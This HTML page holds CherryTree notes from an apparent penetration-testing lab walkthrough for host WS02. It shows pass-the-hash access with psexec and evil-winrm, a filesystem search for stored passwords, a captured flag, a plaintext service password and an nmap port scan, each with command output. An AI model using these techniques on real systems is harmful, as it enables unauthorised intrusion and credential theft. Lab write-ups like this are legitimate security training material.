<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WS02 - 172.16.1.101</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WS02 - 172.16.1.101</h1><br/><p><a href="Offshore--WS02_-_172.16.1.101_12.html#OFS-Flag9">Flag 9</a></p><p><a href="Offshore--WS02_-_172.16.1.101_12.html#OFS-SVCIISCreds">Credentials for 172.16.1.24 / WEB-WIN01</a></p><p></p><p>Psexec into WS02 since we have an admin account (you can use the standard blank LM hash + the hash we found on WSADM)</p><p></p><p><code><span style="background-color:#000000;">└─$ python psexec.py &#39;corp.local/wsadmin@172.16.1.101&#39; -hashes &#39;aad3b435b51404eeaad3b435b51404ee:669b12a3bac275251170afbe2c5de8c2&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Requesting shares on 172.16.1.101.....</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Found writable share ADMIN$</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Uploading file dKIwTFPD.exe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Opening SVCManager on 172.16.1.101.....</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Creating service qaiL on 172.16.1.101.....</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Starting service qaiL.....</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[!] Press help for extra shell commands</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Microsoft Windows [Version 6.1.7601]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">C:\Windows\system32&gt;</span></code></p><p></p><p>Let&#39;s search for flag.txt in the users directories</p><p><code><span style="background-color:#000000;">dir C:\users\ /s /b | findstr /i /c:&quot;flag.txt&quot;</span></code></p><p><code><span style="background-color:#000000;">C:\users\wsadmin\Desktop\flag.txt</span></code></p><p></p><p><code><span style="background-color:#000000;">C:\Windows\system32&gt;type C:\users\wsadmin\Desktop\flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag9"></a>OFFSHORE{mimikatz_d03s_th3_j0b}</p><p></p><p>We need to look around a little to see if there are other creds.  The search command works better in Powershell so let&#39;s see if we can evil-winrm with the hash.</p><p></p><p><code><span style="background-color:#000000;">└─$ evil-winrm -i 172.16.1.101 -u wsadmin -H 669b12a3bac275251170afbe2c5de8c2   </span></code></p><p></p><p>Search for the string password= in any files</p><p></p><p><code><span style="background-color:#000000;">*Evil-WinRM* PS C:\Users\wsadmin\Documents&gt; Get-ChildItem -Path &quot;C:\&quot; -Recurse | Select-String -Pattern &quot;password=&quot; -List</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-SVCIISCreds"></a>C:\Backups\web.config_sample:5:                &lt;user name=&quot;svc_iis&quot; password=&quot;Vintage!&quot; /&gt;</p><p></p><p>Unfortunately we spray these creds out but they don&#39;t seem to work</p><p></p><p>Let&#39;s port scan the hosts we haven&#39;t pwned</p><p></p><p><code><span style="background-color:#000000;">nmap -iL ip_list.txt -p- -oN tcp_portscan.txt</span></code></p><p></p><p>Dump into a list</p><p><code><span style="background-color:#000000;">grep &#39;open&#39; filtered_tcp_portscan.txt | cut -d &#39;/&#39; -f 1 | while read port; do echo $port &gt;&gt; filtered_open_ports.txt; done</span></code></p><p></p><p>Remove duplicates</p><p><code><span style="background-color:#000000;">sort filtered_open_ports.txt | uniq -i &gt; filtered_open_ports2.txt &amp;&amp; rm filtered_open_ports.txt &amp;&amp; mv filtered_open_ports2.txt filtered_open_ports.txt</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ cat filtered_open_ports.txt </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">135</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">139</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1433</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">21</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3268</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3269</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3389</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">389</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">445</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">464</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">5040</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">53</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">55500</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">5800</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">5900</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">59172</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">59227</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">59247</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">593</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">5985</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">636</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">7680</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">80</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">88</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">9389</span></code></p><p></p><p>From the nmap portscan the thing that sticks out to me is the webserver on WEB-WIN01&#39;s port 80, let&#39;s check that out</p></div>
</body>
</html>
